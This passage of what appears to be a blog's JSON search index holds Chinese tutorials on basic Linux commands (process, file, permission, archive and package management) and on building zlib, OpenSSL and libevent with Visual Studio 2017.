www.baidu.com","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"ifconfig查看ip","slug":"linux024ifconfig查看ip","date":"2022-01-07T16:21:35.000Z","updated":"2022-01-07T16:22:16.861Z","comments":true,"path":"2022/01/08/linux024ifconfig查看ip/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/08/linux024ifconfig查看ip/","excerpt":"","text":"ifconfig查看ip 1234567891011121314151617ens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 192.168.44.135 netmask 255.255.255.0 broadcast 192.168.44.255 inet6 fe80::7438:27c1:6044:963d prefixlen 64 scopeid 0x20\\&lt;link&gt; ether 00:0c:29:f2:c7:2a txqueuelen 1000 (以太网) RX packets 28453 bytes 18295064 (18.2 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 10656 bytes 815687 (815.6 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10\\&lt;host&gt; loop txqueuelen 1000 (本地环回) RX packets 945 bytes 84825 (84.8 KB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 945 bytes 84825 (84.8 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 ens33: 代表设备名 broadcast 广播地址 inet： ip地址","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"env查看环境变量和top任务管理器","slug":"linux023env查看环境变量和top任务管理器","date":"2022-01-07T16:19:57.000Z","updated":"2022-01-22T16:43:15.792Z","comments":true,"path":"2022/01/08/linux023env查看环境变量和top任务管理器/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/08/linux023env查看环境变量和top任务管理器/","excerpt":"","text":"查看环境变量 1env 打开任务管理器 1top 10:25:00 当前时间 up 21:31 系统运行时间，格式为时:分 4 users 当前登录用户数 load average: 0.00, 0.00, 0.00 系统负载，即任务队列的平均长度。 三个数值分别为 1分钟、5分钟、15分钟前到现在的平均值。 2、第二行为进程信息统计数据 123456 Tasks — 任务（进程） otal 进程总数 running 正在运行的进程数 sleeping 睡眠的进程数 stopped 停止的进程数 zombie 僵尸进程数 3、第三行CPU信息统计数据： 123456789 Cpu(s)： 0.0% us： 用户空间占用CPU百分比 0.3% sy： 内核(系统)空间占用CPU百分比 0.0% ni： 用户进程空间内改变过优先级的进程占用CPU百分比 99.7% id： 空闲CPU百分比 0.0% wa： 等待输入输出的CPU时间百分比 0.0%hi： 硬件CPU中断占用百分比 0.0%si： 软中断占用百分比 0.0%st： 虚拟机(虚拟化技术)占用百分比 4、第四、五行为内存信息系统数据： Men: 1234 1004768k total： 物理内存总量 463092k used： 使用的物理内存总量 541676k free： 空闲内存总量 64316k buffers： 用作内核缓存的内存量 Swap: 12345678 694268k total： 交换区总量 0 k used： 使用的交换区总量 694268k free： 空闲交换区总量 224884k cached：缓冲的交换区总量（内存中的数据被移动至交换区而后又被送至内存空间，但是使用过的交换区尚未被覆盖，其空间大小即为这些数据已存在于内存中的交换区的大小，相应的内存再次被换出时可不必再次对交换区写入）内存空间还剩多少空闲呢？ totalfree = free 541676 + buffer 64316 + cached 224884 （即：空闲内存 = 空闲内存总量 + 内核缓存的内存量 + 缓冲的交换区总量） 6、进程信息区统计信息区域的下方显示了各个进程的详细信息 123456789101112131415161718192021222324252627序号 列名 含义a PID 进程idb PPID 父进程idc RUSER Real user named UID 进程所有者的用户ide USER 进程所有者的用户名f GROUP 进程所有者的组名g TTY 启动进程的终端名。不是从终端启动的进程则显示为 ?h PR 优先级i NI nice值。负值表示高优先级，正值表示低优先级j P 最后使用的CPU，仅在多CPU环境下有意义k %CPU 上次更新到现在的CPU时间占用百分比l TIME 进程使用的CPU时间总计，单位秒m TIME+ 进程使用的CPU时间总计，单位1/100秒n %MEM 进程使用的物理内存百分比o VIRT 进程使用的虚拟内存总量，单位kb。VIRT=SWAP+RESp SWAP 进程使用的虚拟内存中，被换出的大小，单位kb。q RES 进程使用的、未被换出的物理内存大小，单位kb。RES=CODE+DATAr CODE 可执行代码占用的物理内存大小，单位kbs DATA 可执行代码以外的部分(数据段+栈)占用的物理内存大小，单位kbt SHR 共享内存大小，单位kbu nFLT 页面错误次数v nDRT 最后一次写入到现在，被修改过的页面数。w S 进程状态(D=不可中断的睡眠状态,R=运行,S=睡眠,T=跟踪/停止,Z=僵尸进程)x COMMAND 命令名/命令行y WCHAN 若该进程在睡眠，则显示睡眠中的系统函数名z Flags 任务标志，参考 sched.h 【备注：默认情况下仅显示比较重要的 PID、USER、PR、NI、VIRT、RES、SHR、S、%CPU、%MEM、TIME+、COMMAND 列。可以通过下面的快捷键来更改显示内容】 linux 环境变量： ​ 变量=值 ​ 多个值用 : 隔开 ​ PATH=A:B:C:D","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"ps查看进程信息和kill结束进程","slug":"linux022ps查看进程信息和kill结束进程","date":"2022-01-07T16:16:08.000Z","updated":"2022-01-07T16:17:58.914Z","comments":true,"path":"2022/01/08/linux022ps查看进程信息和kill结束进程/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/08/linux022ps查看进程信息和kill结束进程/","excerpt":"","text":"ps查看进程信息 ​ 参数： ​ a 显示现行终端机下的所有程序，包括其他用户的程序。 ​ u代表 以用户为主的格式来显示程序状况。 ​ x 代表没有终端的程序 1ps aux | 管道 ​ 将A输出作为B输入 1ps aux | grep bash //将ps输出的结果作为grep的输入，然后将结果显示回终端 kill kill -l //查看信号 kill -信号(可以只写数字) PID 12kill -9 13442kill -SIGKILL 123432","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"压缩和解压缩命令","slug":"linux021压缩和解压缩命令","date":"2022-01-07T16:09:55.000Z","updated":"2022-01-07T16:15:03.679Z","comments":true,"path":"2022/01/08/linux021压缩和解压缩命令/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/08/linux021压缩和解压缩命令/","excerpt":"","text":"gzip 压缩出来的文件以.gz结尾 不保留源文件 不能对目录进行打包压缩 12gzip 文件名gzip *.txt ​ 解压： 12gunzip 文件名gunzip *.gz bzip2 ​ 后缀名为:.bz2 -k 来保留源文件 不能对目录进行打包压缩 ​ 123bzip2 文件名bzip2 *.txtbzip2 -k *.txt tar 不使用z或j参数，该命令只能对文件或目录打包 c–创建—压缩 x–释放—解压缩 v–显示提示信息 f–指定压缩文件的名字 z–使用gzip的方式压缩文件 j–使用bzip2的方式压缩文件 压缩： 12tar -zcvf 生成的压缩包的名字（xxx.tar.gz） 要压缩的文件或目录tar -jcvf 生成的压缩包的名字（xxx.tar.bz2）要压缩的文件或目录 解压： 123456tar -zxvf 压缩包名字 //解压到当前目录tar -jxvf 压缩包名字 //解压到当前目录 tar -zxvf 压缩包名字 -C（大写） 指定的目录tar -zxvf xxx.tar.gz -C ./testtar -jxvf xxx.tar.gz -C ./test rar ​ 压缩： 12rar a 压缩包的文件名 源文件rar a bird *.c ​ 解压： 1234rar x 压缩包名 （解压到当前文件夹）rar x 压缩包名 解压的路径rar x bird.rarrar x bird.rar ./ zip ​ 参数： 压缩目录要加参数 -r ​ 压缩： 12zip 压缩包的名字 压缩的文件或目录zip man *.txt ​ 解压缩： 12unzip 压缩包的名字unzip 压缩包的名字 -d 解压目录","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"U盘挂载和卸载","slug":"linux020U盘挂载和卸载","date":"2022-01-07T16:01:38.000Z","updated":"2022-01-07T16:09:19.272Z","comments":true,"path":"2022/01/08/linux020U盘挂载和卸载/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/08/linux020U盘挂载和卸载/","excerpt":"","text":"卸载: 1umount 设备文件名 挂载: 1mount 设备文件名 挂载路径 自己在U盘目录里面是无法卸载的 ，就相当于不能在自己房间里才房间一样 将外设挂载到非/mnt目录时,会临时覆盖原来内容,卸载之后会恢复 lsof命令 ​ 用于查看你进程打开的文件，打开文件的进程，进程打开的端口(TCP、UDP)。 ​ 12lsof 参数 文件lsof /mnt/ ​ -a 列出打开文件存在的进程 -c&lt;进程名&gt; 列出指定进程所打开的文件 -g 列出GID号进程详情 -d&lt;文件号&gt; 列出占用该文件号的进程 +d&lt;目录&gt; 列出目录下被打开的文件 +D&lt;目录&gt; 递归列出目录下被打开的文件 -n&lt;目录&gt; 列出使用NFS的文件 -i&lt;条件&gt; 列出符合条件的进程。（4、6、协议、:端口、 @ip ） -p&lt;进程号&gt; 列出指定进程号所打开的文件 -u 列出UID号进程详情 -h 显示帮助信息 -v 显示版本信息","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"软件的安装和卸载","slug":"linux019软件的安装和卸载","date":"2022-01-07T15:56:39.000Z","updated":"2022-01-07T16:59:23.677Z","comments":true,"path":"2022/01/07/linux019软件的安装和卸载/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/07/linux019软件的安装和卸载/","excerpt":"","text":"在线安装 apt-get ​ 安装 1sudo apt-get install 软件名 ​ 卸载 1sudo apt-get remove 软件名 ​ 更新 1sudo apt-get update 更新软件列表 ​ 软件列表存放的是软件名字和下载地址 清理所有软件安装包 1sudo apt-get clean 实际清理的是: /var/cache/apt/archives目录下的.deb文件 aptitude 12安装 ：sudo apt-get install aptitudesudo aptitude show 软件名 //查看软件是否安装 安装： 1sudo aptitude install 软件名 重新安装： 1sudo aptitude reinstall 软件名 更新： 1sudo apt-get update 移除： 1sudo aptitude rermove 软件名 显示状态： 1sudo aptitude show 软件名 deb包安装 安装 1sudo dpkg -i xxx.deb 卸载 1sudo dpkg -r xxx 源码安装 12345671.解压缩源代码包2.进入到安装目录3.检测文件是否缺失,创建Makefile,检测编译环境: ./configure4.编译源码 生成库和可以执行程序:make5.把库和可执行程序,安装到系统目录下: sudo make install6.删除和卸载软件:sudo make distclean7.上述安装步骤并不是绝对的,应该先查看附带的README文件","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"创建管道文件","slug":"linux018创建管道文件","date":"2022-01-07T15:55:56.000Z","updated":"2022-01-07T15:56:22.071Z","comments":true,"path":"2022/01/07/linux018创建管道文件/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/07/linux018创建管道文件/","excerpt":"","text":"创建管道文件： 1mkfifo 文件名","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"文件的查找","slug":"linux017文件的查找","date":"2022-01-07T15:48:39.000Z","updated":"2022-01-07T15:53:11.709Z","comments":true,"path":"2022/01/07/linux017文件的查找/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/07/linux017文件的查找/","excerpt":"","text":"按文件属性查找： 文件名： 1find 查找的目录 -name “文件的名字” 通配符：*代表所有字符 ？ 代表一个字符 文件大小： 1find 查找的目录 / -size +10k · find 查找的目录 / -size -10k · find 查找的目录 / -size -10M find 查找的目录 / -size +10k -size -10M //表示大于10KB小于10MB的文件 +代表大于 - 代表小于 数字后面的字母区分大小写 文件类型： find 查找的目录 -type 文件类型 12find / -type sfind / -type s 按文件内容查找 1grep -r “查找内容” 查找路径 ​ -r 代表递归查找","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"修改文件所有者和所属组","slug":"linux016修改文件所有者和所属组","date":"2022-01-07T15:45:21.000Z","updated":"2022-01-07T15:47:07.996Z","comments":true,"path":"2022/01/07/linux016修改文件所有者和所属组/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/07/linux016修改文件所有者和所属组/","excerpt":"","text":"修改文件所有者 12chown 用户名 文件名 //改变所有者chown 用户名:所属组 文件名 //同时改变所有者和所属组 修改文件所属组 1chgrp 所属组 文件名 ​ 目录必须拥有执行权限 ​ 如果目录没有执行权限x，会提示进不去的","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"修改文件权限","slug":"linux015修改文件权限","date":"2022-01-07T15:34:17.000Z","updated":"2022-01-07T15:43:36.391Z","comments":true,"path":"2022/01/07/linux015修改文件权限/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/07/linux015修改文件权限/","excerpt":"","text":"文字设定法： chmod [who] [+|-|=] [mode] ​ who: ​ 文件所有者： u ​ 文件所属组： g ​ 其他人： o ​ 所有的人： a ​ +：添加权限 -：减少权限 =：覆盖原来的权限 mode： r：读 w：写 x：执行 123chmod go-rw 文件名chmod go+rw 文件名chmod go=w 文件名 数字设定法 chmod 权限数字 文件名 12345root@yc:/home/yxc19980620c/my# lldrwxr-xr-x 3 yxc19980620c root 12288 1月 7 23:42 ./drwxr-xr-x 41 yxc19980620c root 4096 1月 7 16:30 ../-rw-r--r-- 1 yxc19980620c root 60 12月 28 03:19 add.c-rw-r--r-- 1 yxc19980620c root 1232 12月 29 01:04 add.o ​ -：没有权限 ​ r：4 ​ w：2 ​ x：1 765 7 – rwx --文件所有者 其中7代表文件所有者具有读写执行权限 6 – rw --文件所属组 6代表文件所属组具有读写权限 5 – rx --其他人 5代表其他人具有读和执行权限 12chmod 765 文件名chmod -001 文件名 //减去其他人的执行权限","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"文件和目录属性命令","slug":"linux014文件和目录属性命令","date":"2022-01-07T15:28:35.000Z","updated":"2022-01-07T15:33:10.799Z","comments":true,"path":"2022/01/07/linux014文件和目录属性命令/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/07/linux014文件和目录属性命令/","excerpt":"","text":"wc命令、od命令、du命令、df命令、which命令、whoami命令 wc 获取文本文件的信息 12yxsdc19c@yscc:/usr/include$ wc time.h 309 1515 10360 time.h 309代表行数 1515代表单词个数 10360代表字节数 od 查看二进制文件 1od -t 文件名 1234567-t 指定数据的显示格式-tc ASCII字符-tx 十六进制数-td 有符号十进制数-tu 无符号十进制数-to 八进制数-tf 浮点数 查看某个目录的大小du 1du -h 目录 -h代表人性化输出 df查看磁盘的使用情况 1df -h 查看命令在哪个目录 which 1which 命令名 ​ 内建命令是查不到的，例如cd，只能查外建命令 查看当前用户 whoami 1whoami","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"grep文件的检索","slug":"linux013文件的检索","date":"2022-01-07T15:26:18.000Z","updated":"2022-01-07T15:27:44.918Z","comments":true,"path":"2022/01/07/linux013文件的检索/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/07/linux013文件的检索/","excerpt":"","text":"grep命令 grep -r “文件内容” 路径 -r代表递归检索文件 1grep -r &quot;printf&quot; / 从根目录开始递归查找文件包含&quot;printf&quot;内容的文件","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"ln创建软连接和硬链接","slug":"linux012ln创建软连接和硬链接","date":"2022-01-07T15:24:21.000Z","updated":"2022-01-07T15:25:59.295Z","comments":true,"path":"2022/01/07/linux012ln创建软连接和硬链接/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/07/linux012ln创建软连接和硬链接/","excerpt":"","text":"ln 创建软链接 1ln -s 源文件(绝对路径) 目标文件 ​ 创建软链接最好使用绝对路径 ​ ln 创建硬链接 1ln 源文件(绝对路径) 目标文件 ​ 只有文件才可以创建硬链接，不可以为目录创建硬链接 ​ 硬链接是指向i（inode）节点的，在linux中所有文件都有一个i节点，i节点保存了一些文件信息 ​ linux通过i节点找到文件的位置","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"mv命令","slug":"linux011mv命令","date":"2022-01-07T15:23:01.000Z","updated":"2022-01-07T15:23:41.434Z","comments":true,"path":"2022/01/07/linux011mv命令/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/07/linux011mv命令/","excerpt":"","text":"文件改名 1mv 源文件 改名后的文件 移动 1mv 文件名 目录名 //将文件移动到目录中","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"查看文件内容","slug":"linux010查看文件内容","date":"2022-01-07T15:12:56.000Z","updated":"2022-01-07T15:16:12.683Z","comments":true,"path":"2022/01/07/linux010查看文件内容/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/07/linux010查看文件内容/","excerpt":"","text":"gedit gedit 文件名 图形界面的编辑器 cat cat 文件名 cat 文件1 文件2 … 文件n 拼接查看文件 cat 文件1 | more more more 文件名 回车 一行 空格 一页 只能往后看 q 退出 ctrl + c 退出 less less 文件名 回车 一行 空格 一页 可以往前后看 q 退出 ctrl + c 退出 ctrl + p 向前一行 ctrl + n 向后一行 ctrl +b 向前一页 ctrl + f 向后一下 head 用来显示前面几行 head 文件名 显示文件前十行 head -5 文件名 显示文件前五行 tail 用来显示最后几行 tail 文件名 显示文件后十行 tail -5 文件名 显示文件后五行","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"文件和目录的拷贝","slug":"linux009文件和目录的拷贝","date":"2022-01-07T15:09:17.000Z","updated":"2022-01-07T15:12:08.512Z","comments":true,"path":"2022/01/07/linux009文件和目录的拷贝/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/07/linux009文件和目录的拷贝/","excerpt":"","text":"文件和目录的拷贝 ​ cp 源文件 目标文件名 ​ cp h1 h2 ​ 将h1复制一份并命名为h2 ​ 如果h2存在将原来内容覆盖 ​ cp 源目录 目标目录 -r ​ 如果目标目录不存在就将源码目拷贝一份并命名为目标目录 ​ 如果目标目录存在,就将源目录拷贝一份,复制到目的目录里面","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"删除目录和文件","slug":"linux008删除目录和文件","date":"2022-01-07T15:06:01.000Z","updated":"2022-01-07T15:08:09.673Z","comments":true,"path":"2022/01/07/linux008删除目录和文件/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/07/linux008删除目录和文件/","excerpt":"","text":"删除目录和文件 ​ rmdir 空目录名 rmdir只能删除空目录 rm 要删除有文件的目录需要加-r参数 ​ rm 目录名 -rf (f代表不提示) ​ rm 文件名 -f ​ rm 目录名 -ri (i代表提示)","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"文件目录和文件的创建","slug":"linux007文件目录和文件的创建","date":"2022-01-07T14:59:25.000Z","updated":"2022-01-07T15:01:10.149Z","comments":true,"path":"2022/01/07/linux007文件目录和文件的创建/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/07/linux007文件目录和文件的创建/","excerpt":"","text":"文件目录和文件的创建 创建目录 mkdir 目录名 mkdir dri/dir/dir -p 递归创建目录 mkdir -p dir/dir/dir 创建文件 touch 文件名 touch 文件名1 文件名2 … 文件名n","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"Linux目录cd命令和ls命令和tree命令pwd命令","slug":"linux006Linux目录cd命令和ls命令和tree命令pwd命令","date":"2022-01-07T14:52:18.000Z","updated":"2022-01-07T15:44:33.402Z","comments":true,"path":"2022/01/07/linux006Linux目录cd命令和ls命令和tree命令pwd命令/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/07/linux006Linux目录cd命令和ls命令和tree命令pwd命令/","excerpt":"","text":"目录 / 根目录 ls / /bin 常用的命令 cd /bin 进入bin目录 /boot 开机启动项文件 /dev 设备文件 /etc 配置文件 /home 主目录,存放用户 /lib 动态链接库(共享库) /lost-found 存放文件碎片 /media 挂载外设 U盘或光盘等等 /mnt 手动挂载外设到这个目录 /opt 第三方软件 /root 超级用户目录 /sbin 管理员使用的系统管理程序 /usr 用户软件资源目录(用户的软件或文件) /usr/bin 系统用户的应用程序 /usr/sbin 超级用户使用的管理程序和系统守护程序 /usr/src 内核源码默认的放置目录 cd命令 cd 进入指定目录 绝对路径 从/开始 相对路径 ./当前路径 …/上一级路径 cd - 两个相邻目录切换 cd ~ 切换到当前用户目录 cd 切换到用户目录 yxc19980620c@yc:~$ yxc19980620c 用户名 yc 主机名 ~ 用户目录 $普通用户 超级用户root 切换到超级用户 sudo su 或 su root ls命令 -rw-r–r-- 1 root root 1937 9月 2 2020 ucontext.h 文件类型 所有者 所属组 其他人 硬连接数 文件所有者 文件所属组 文件大小 日期 文件名 文件类型 普通文件 d 目录 l 链接符号 b 块设备 c 字符设备 s socket文件 p 管道 ls和tree的使用: ls -a 显示所有文件 ls -l 详细显示 ls -R 递归列出当前目录 ls -al ls -h 人性化显示文件大小 ls -l 也可以写成ll tree命令和pwd命令 tree 目录 pwd 查看当前位置","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"快捷键","slug":"linux005快捷键","date":"2022-01-07T14:51:24.000Z","updated":"2022-01-07T14:56:08.554Z","comments":true,"path":"2022/01/07/linux005快捷键/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/07/linux005快捷键/","excerpt":"","text":"终端：(虚拟终端) 所有输入输出设备总称 shell： 命令解析器 bash： bore again shell 命令解析器。 快捷键: 命令和路径补齐: tab 主键盘快捷键: 1).历史命令切换: 历史命令:history 向上遍历: ctrl + p 向下遍历: ctrl + n 2).光标移动: 向左: ctrl + b 向右: ctrl + f 移动到头部: ctrl + a 移动到尾部: ctrl + e 3).删除字符: 删除光标后边的字符: ctrl + d 删除光标前面的字符: ctrl + h 删除光标前面的所有内容: ctrl + u ctrl + l 清屏,或clear","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"libevent源码vs2017编译完成包含openssl模块","slug":"libev004libevent源码vs2017编译完成包含openssl模块","date":"2022-01-06T17:46:28.000Z","updated":"2022-01-06T18:18:59.488Z","comments":true,"path":"2022/01/07/libev004libevent源码vs2017编译完成包含openssl模块/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/07/libev004libevent源码vs2017编译完成包含openssl模块/","excerpt":"","text":"编译libevent 编译命令 1C:\\Program Files (x86)\\Microsoft Visual Studio\\2017\\Community\\VC\\Auxiliary\\Build\\vcvarsamd64_x86.bat 1nmake /f Makefifile.nmake clean 1nmake /f Makefifile.nmake OPENSSL_DIR=D:\\lib\\openssl OPENSSL_DIR= 指定openssl目录 出现问题 openssl问题 修改test目录下 Makefifile.nmake 文件内容 1SSL_LIBS=..\\libevent_openssl.lib $(OPENSSL_DIR)\\lib\\libeay32.lib $(OPENSSL_DIR)\\lib\\ssleay32.lib gdi32.lib User32.lib 改成 1SSL_LIBS=..\\libevent_openssl.lib $(OPENSSL_DIR)\\lib\\libssl.lib $(OPENSSL_DIR)\\lib\\libcrypto.lib gdi32.lib User32.lib 步骤: 1.打开VS 2017的 x64_x86 交叉工具命令提示符 2.进入到libevent-master目录 3.输入nmake /f Makefifile.nmake OPENSSL_DIR=D:\\lib\\openssl OPENSSL_DIR= 这里的路径是我们生成的openssl路径 4.出现错误 找不到libeay32.lib 可以改掉自己的openssl文件 或者改掉libevent-master\\test\\Makefile.nmake文件内容 5.打开regress.exe程序 可能会出现缺失libcrypto-1_1.dll文件和libssl-1_1.dll文件 下载回来之后放在C:\\Windows\\SysWOW64目录即可","categories":[{"name":"libevent","slug":"libevent","permalink":"https://xiaowuyoucy.github.io/categories/libevent/"}],"tags":[]},{"title":"用vs2017编译openssl源码并完成编译批处理脚本","slug":"libev003用vs2017编译openssl源码并完成编译批处理脚本","date":"2022-01-06T17:20:03.000Z","updated":"2022-01-06T18:20:52.845Z","comments":true,"path":"2022/01/07/libev003用vs2017编译openssl源码并完成编译批处理脚本/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/07/libev003用vs2017编译openssl源码并完成编译批处理脚本/","excerpt":"","text":"编译openssl 依赖项 perl https://pan.baidu.com/s/ 1BXPRcDAUFN2vJOrNvkZIwQ nasm 默认安装目录: C:\\Users\\xiaca\\AppData\\Local\\bin\\NASM 安装后配置到环境变量path中 下载地址:https://pan.baidu.com/s/1BXPRcDAUFN2vJOrNvkZIwQ 编译命令 1C:\\Program Files (x86)\\Microsoft Visual Studio\\2017\\Community\\VC\\Auxiliary\\Build\\vcvarsamd64_x86.bat 12perl Confifigure &#123; VC-WIN32 | VC-WIN64A | VC-WIN64I | VC-CE &#125; --prefifix=%OUTPATH% perl Confifigure VC-WIN32 nmake make test nmake install C:\\Program Files (x86)\\OpenSSL 如果c盘需要管理员权限运行 步骤: 1.先安装perl和nasm 全部点下一步 nasma解压后添加到PATH环境变量里 控制台重启生效 2.打开VS 2017的 x64_x86 交叉工具命令提示符 进入到openssl目录 输入perl Configure VC-WIN32 --prefix=E:\\libevent\\out\\vs2017_32\\openssl --prefix= 指定输出路径 3.编译 1nmake 4.安装 1nmake install 编译批处理脚本 123456789101112@echo &quot;开始编译openssl&quot;set VS=&quot;C:\\Program Files (x86)\\Microsoft Visual Studio\\2017\\Community\\VC\\Auxiliary\\Build\\vcvarsamd64_x86.bat&quot;set OUT=E:\\libevent\\out\\vs2017_32\\opensslcall %VS%E:cd E:\\libevent\\openssl-1.1.1perl Configure VC-WIN32 --prefix=%OUT%nmake cleannmakenmake install@echo &quot;build openssl end&quot;pause","categories":[{"name":"libevent","slug":"libevent","permalink":"https://xiaowuyoucy.github.io/categories/libevent/"}],"tags":[]},{"title":"用vs2017编译zlib源码并完成编译批处理脚本","slug":"libev002用vs2017编译zlib源码并完成编译批处理脚本","date":"2022-01-06T16:44:23.000Z","updated":"2022-01-06T18:20:03.862Z","comments":true,"path":"2022/01/07/libev002用vs2017编译zlib源码并完成编译批处理脚本/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/07/libev002用vs2017编译zlib源码并完成编译批处理脚本/","excerpt":"","text":"编译zlib 编译32位 1C:\\Program Files (x86)\\Microsoft Visual Studio\\2017\\Community\\VC\\Auxiliary\\Build\\vcvarsamd64_x86.bat 编译64位 1&quot;C:\\Program Files (x86)\\Microsoft Visual Studio\\2017\\Community\\VC\\Auxiliary\\Build\\vcvars64.bat&quot; 1nmake -f win32/Makefifile.msc VS 2017的 x64_x86 交叉工具命令提示符 64位平台编译32位用这个工具 适用于 VS 2017 的 x64 本机工具命令提示 编译64位源码用这个工具 适用于 VS 2017 的 x86_x64 兼容工具命令提示 用32位平台来编译64位源码 打开VS 2017的 x64_x86 交叉工具命令提示符并且进入到zlib目录 编译 1nmake /f WIN32\\Makefile.msc 编译批处理脚本 12345678910111213141516@echo &quot;开始编译zlib&quot;set VS=&quot;D:\\Program Files (x86)\\Microsoft Visual Studio\\2017\\Community\\VC\\Auxiliary\\Build\\vcvarsamd64_x86.bat&quot;set OUT=F:\\libevent\\out\\vs2017_32\\zlibcall %VS%cd zlib-1.2.11nmake /f win32\\Makefile.msc cleannmake /f win32\\Makefile.mscmd %OUT%\\libmd %OUT%\\binmd %OUT%\\includecopy /Y *.lib %OUT%\\libcopy /Y *.h %OUT%\\includecopy /Y *.dll %OUT%\\bincopy /Y *.exe %OUT%\\bin@echo &quot;zlib编译结束&quot;pause 1set VS= //自己VS 2017的 x64_x86 交叉工具命令提示符的路径 1set OUT= //输出文件的路径 1call %VS% //代表调用vcvarsamd64_x86.bat 1nmake /f win32\\Makefile.msc clean //清理编译出来的文件 1nmake /f win32\\Makefile.msc //编译 123md %OUT%\\lib //创建lib目录md %OUT%\\bin //创建bin目录md %OUT%\\include //创建include目录 1234copy /Y *.lib %OUT%\\lib //不提示复制所有后缀为.lib的文件到%OUT%\\lib目录copy /Y *.h %OUT%\\include //不提示复制所有后缀为.h的文件到%OUT%\\include目录copy /Y *.dll %OUT%\\bin //不提示复制所有后缀为.dll的文件到%OUT%\\bin目录copy /Y *.exe %OUT%\\bin //不提示复制所有后缀为.exe的文件到%OUT%\\bin目录","categories":[{"name":"libevent","slug":"libevent","permalink":"https://xiaowuyoucy.github.io/categories/libevent/"}],"tags":[]},{"title":"windows平台编译libevent分析及环境安装和源码","slug":"libev001windows平台编译libevent分析及环境安装和源码","date":"2022-01-06T16:02:42.000Z","updated":"2022-01-06T18:19:23.864Z","comments":true,"path":"2022/01/07/libev001windows平台编译libevent分析及环境安装和源码/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/07/libev001windows平台编译libevent分析及环境安装和源码/","excerpt":"","text":"环境准备 windows 10 64位 VS2017社区版本 perl 编译openssl用 nasm 编译openssl用 zlib1.2.11源码 压缩/解压缩用的 官方地址: 1www.zlib.net openssl 1.1.1 源码 加密传输 官方地址: 1www.openssl.org/source/ libevent 2.1.8 源码 ffmpeg.club/libevent 官方地址: 1libevent.org","categories":[{"name":"libevent","slug":"libevent","permalink":"https://xiaowuyoucy.github.io/categories/libevent/"}],"tags":[]},{"title":"循环链表","slug":"sf0004循环链表","date":"2022-01-06T08:01:04.000Z","updated":"2022-01-06T16:53:04.464Z","comments":true,"path":"2022/01/06/sf0004循环链表/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/06/sf0004循环链表/","excerpt":"","text":"链表操作: 